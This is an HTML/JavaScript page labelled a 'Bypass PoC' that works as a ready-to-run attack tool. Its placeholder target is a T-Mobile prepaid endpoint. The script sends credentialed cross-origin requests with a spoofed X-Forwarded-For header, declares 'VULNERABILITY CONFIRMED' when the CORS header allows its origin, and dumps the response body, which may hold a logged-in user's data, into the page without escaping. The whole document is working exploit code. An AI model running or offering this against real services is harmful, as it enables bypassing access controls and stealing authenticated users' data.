<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Fermionic Plants - Bypass PoC</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: #e1e1e1; padding: 20px; }
        .wrapper { max-width: 850px; margin: auto; }
        .card { background: #1c2128; border: 1px solid #444c56; border-radius: 8px; padding: 25px; margin-bottom: 20px; border-top: 5px solid #e20074; }
        h1 { color: #e20074; margin: 0 0 10px 0; font-size: 1.5rem; }
        label { display: block; margin: 10px 0 5px 0; font-size: 0.85rem; color: #8b949e; }
        input, select { width: 100%; padding: 12px; background: #2d333b; border: 1px solid #444c56; color: white; border-radius: 5px; box-sizing: border-box; font-family: monospace; }
        
        .btn-container { display: flex; gap: 10px; margin-top: 20px; }
        .btn-fire { background: #e20074; color: white; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; flex: 2; text-transform: uppercase; }
        .btn-clear { background: #30363d; color: #8b949e; border: 1px solid #444c56; padding: 15px; border-radius: 5px; cursor: pointer; flex: 1; }
        
        #log { background: #0d1117; border: 1px solid #30363d; padding: 15px; height: 350px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; margin-top: 10px; border-radius: 5px; }
        .success { color: #238636; font-weight: bold; }
        .fail { color: #da3633; }
        .data-out { display: block; background: #161b22; padding: 10px; margin-top: 10px; border: 1px solid #30363d; color: #c9d1d9; word-break: break-all; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="card">
        <h1>Fermionic Plants - Bypass PoC</h1>
        
        <label>Target URL:</label>
        <input type="text" id="target" placeholder="https://prepaid.t-mobile.com/akam/13/..." value="">

        <div style="display: flex; gap: 10px;">
            <div style="flex: 1;">
                <label>HTTP Method:</label>
                <select id="method">
                    <option value="GET">GET</option>
                    <option value="POST">POST</option>
                    <option value="PUT">PUT</option>
                </select>
            </div>
            <div style="flex: 1;">
                <label>Bypass Header (Key: Value):</label>
                <input type="text" id="customHeader" placeholder="X-Forwarded-For: 127.0.0.1">
            </div>
        </div>

        <div class="btn-container">
            <button class="btn-fire" onclick="runExploit()">Execute Exploit</button>
            <button class="btn-clear" onclick="document.getElementById('log').innerHTML = '--- Log Cleared ---'">Clear Log</button>
        </div>
    </div>

    <div class="card" style="padding: 10px;">
        <h3 style="margin-left: 15px; color: #e20074;">Audit Output</h3>
        <div id="log">Waiting for execution...</div>
    </div>
</div>

<script>
    async function runExploit() {
        const url = document.getElementById('target').value;
        const method = document.getElementById('method').value;
        const headerInput = document.getElementById('customHeader').value;
        const log = document.getElementById('log');

        if(!url) { alert("Please enter a URL"); return; }

        log.innerHTML = `[+] Sending ${method} request to target...<br>`;

        let headers = { 'Content-Type': 'application/json' };
        if (headerInput.includes(':')) {
            const [k, v] = headerInput.split(':').map(s => s.trim());
            headers[k] = v;
        }

        try {
            const response = await fetch(url, {
                method: method,
                mode: 'cors',
                credentials: 'include',
                headers: headers,
                body: method === 'POST' ? JSON.stringify({}) : null
            });

            const acao = response.headers.get('Access-Control-Allow-Origin');
            const text = await response.text();

            log.innerHTML += `[+] Status: <span class="${response.status === 200 ? 'success' : 'fail'}">${response.status}</span><br>`;
            log.innerHTML += `[+] ACAO Header: ${acao || 'None'}<br>`;
            
            if (acao && (acao === '*' || acao.includes(window.location.hostname))) {
                log.innerHTML += `<br><span class="success">!!! VULNERABILITY CONFIRMED !!!</span><br>`;
            }
            
            log.innerHTML += `<span class="data-out">${text.substring(0, 2000) || 'Empty Response Body'}</span>`;

        } catch (e) {
            log.innerHTML += `<br><span class="fail">[!] Error: ${e.message}</span><br>Check if the server allows this header in CORS preflight.`;
        }
    }
</script>

</body>
</html>
